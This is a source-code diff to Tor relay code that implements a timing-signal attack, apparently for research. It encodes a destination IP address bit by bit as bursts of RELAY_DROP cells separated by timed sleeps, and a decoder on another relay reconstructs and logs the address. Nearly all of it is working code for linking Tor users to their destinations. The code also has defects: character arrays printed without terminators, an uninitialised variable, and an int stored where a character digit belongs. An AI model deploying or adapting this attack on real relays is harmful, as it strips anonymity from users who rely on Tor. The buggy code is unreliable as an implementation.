@@ -70,6 +70,13 @@ STATIC void handle_timing_add(signal_decode_t *circ_timing, struct timespec *now
       break;
     case BANDWIDTH_EFFICIENT:
       //todo
+        if (smartlist_len(circ_timing->timespec_list) > 32*3+1) {
+        tor_free(circ_timing->timespec_list->list[0]);
+        smartlist_del_keeporder(circ_timing->timespec_list, 0);
+        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
+      }
+      smartlist_add(circ_timing->timespec_list, now);
+      circ_timing->last = *now;
       break;
     default:
       log_debug(LD_BUG, "handle_timing_add default case reached. It should not happen");
@@ -145,7 +152,69 @@ STATIC int signal_minimize_blank_latency_decode(signal_decode_t *circ_timing) {
   return 0;
 }
 static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
-  
+  int i, bit;
+  int count = 1;
+  int nbr_sub_ip_decoded = 0;
+  char subips[4][8];
+  int nth_bit = 7;
+  for (i = 1; i < smartlist_len(circ_timing->timespec_list); i++) {
+    switch(delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
+        smartlist_get(circ_timing->timespec_list, i))) {
+      case 0:
+        if (count == 2) 
+          bit = 0;
+        else if (count == 3)
+          bit = 1;
+        else {
+          log_info(LD_SIGNAL_ATTACK, "Signal distorded or no signal, count: %d", count);
+          /*return 0; // no signal or distorded*/
+        }
+        if (bit & 1)
+          subips[nbr_sub_ip_decoded][nth_bit--] = '1';
+        else
+          subips[nbr_sub_ip_decoded][nth_bit--] = '0';
+        log_info(LD_SIGNAL_ATTACK, "nth_bit: %d", nth_bit);
+        if (nth_bit < 0) {
+          // we have decoded a subip
+          log_info(LD_SIGNAL_ATTACK, "subip ip found:%s\n",
+              subips[nbr_sub_ip_decoded]);
+          if (nbr_sub_ip_decoded == 3) {
+            log_info(LD_SIGNAL_ATTACK, "dest IP in binary: %s.%s.%s.%s\n",
+                subips[0], subips[1], subips[2], subips[3]);
+            return 1;
+          }
+          nth_bit = 7;
+          nbr_sub_ip_decoded++;
+        }
+        count = 1;
+        break;
+      case 1:
+        count++;
+        break;
+      case 2:
+        if (nbr_sub_ip_decoded == 3 && nth_bit == 0) {
+          int bit;
+          if (count == 2)
+            bit = 0;
+          else if (count == 3)
+            bit = 1;
+          else {
+            log_info(LD_SIGNAL_ATTACK, "signal distorded: %s.%s.%s.%s - count %d",
+                subips[0], subips[1], subips[2], subips[3], count);
+            /*return 0;*/
+          }
+          subips[nbr_sub_ip_decoded][nth_bit] = bit;
+          log_info(LD_SIGNAL_ATTACK, "dest IP in binary: %s.%s.%s.%s\n",
+                subips[0], subips[1], subips[2], subips[3]);
+          return 1;
+        }
+        return 0;
+        break;
+      default:
+        return -1;
+        break;
+    }
+  }
   return 0;
 }
 
@@ -194,16 +263,9 @@ STATIC int signal_listen_and_decode(circuit_t *circ) {
 //--------------------------END _DECODING_ FUNCTION-------------------------------
 
 //-------------------------- _ENCODING_ FUNCTION ---------------------------------
-STATIC void signal_bandwidth_efficient(char *address, circuit_t *circ) {
-
-}
-STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
-  struct timespec time, rem;
-  const or_options_t *options = get_options();
-  time.tv_sec = 0;
-  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
+static void address_to_subip(char *address, int *subip) {
+  
   char *tmp_subaddress;
-  int subip[4];
   tmp_subaddress = strtok(address, ".");
   int i = 0;
   subip[i++] = atoi(tmp_subaddress);
@@ -213,13 +275,69 @@ STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
       subip[i++] = atoi(tmp_subaddress);
     }
   }
+}
+
+STATIC void subip_to_subip_bin(uint8_t subip, char *subip_bin) {
+  int k;
+  for (int i=7; i>=0; i--) {
+    k = subip >> i;
+    if (k & 1)
+      subip_bin[i] = '1';
+    else
+      subip_bin[i] = '0';
+  }
+}
+
+STATIC int signal_bandwidth_efficient(char *address, circuit_t *circ) {
+  struct timespec time, rem;
+  const or_options_t *options = get_options();
+  time.tv_sec = 0;
+  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
+  int subip[4];
+  address_to_subip(address, subip);
+  char subip_bin[8];
+  for (int i = 0; i < 4; i++) {
+    subip_to_subip_bin((uint8_t)subip[i], subip_bin);
+    for (int j = 7; j > -1; j--) {
+      if (subip_bin[j] == '0') {
+        if (signal_send_relay_drop(2, circ) < 0) {
+          log_info(LD_SIGNAL_ATTACK, "BUG: signal_send_relay_drop returned -1\n");
+          return -1;
+        }
+      }
+      else if (subip_bin[j] == '1') {
+        if (signal_send_relay_drop(3, circ) < 0) {
+          log_info(LD_SIGNAL_ATTACK, "BUG: signal_send_relay_drop returned -1\n");
+          return -1;
+        }
+      }
+      else {
+        log_info(LD_SIGNAL_ATTACK, "BUG: something went wrong with subip_bin: %s", subip_bin);
+      }
+      if (nanosleep(&time, &rem) < 0) {
+        log_info(LD_SIGNAL_ATTACK, "BUG: nanosleep call failed\n");
+        return -1;
+      }
+    }
+  }
+  return 0;
+}
+
+STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
+  struct timespec time, rem;
+  const or_options_t *options = get_options();
+  time.tv_sec = 0;
+  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
+  int i;
+  int subip[4];
+  address_to_subip(address, subip);
   for (i = 0; i < 4; i++) {
     if (signal_send_relay_drop(subip[i]+1, circ) < 0) { //offset 1 for encoding 0.
       return -1;
     }
     /*sleep(1); //sleep 1second*/
     if (nanosleep(&time, &rem) < 0) {
-      log_debug(LD_BUG, "nanosleep call failed \n");
+      log_info(LD_SIGNAL_ATTACK, "BUG: nanosleep call failed\n");
       return -1;
     }
   }
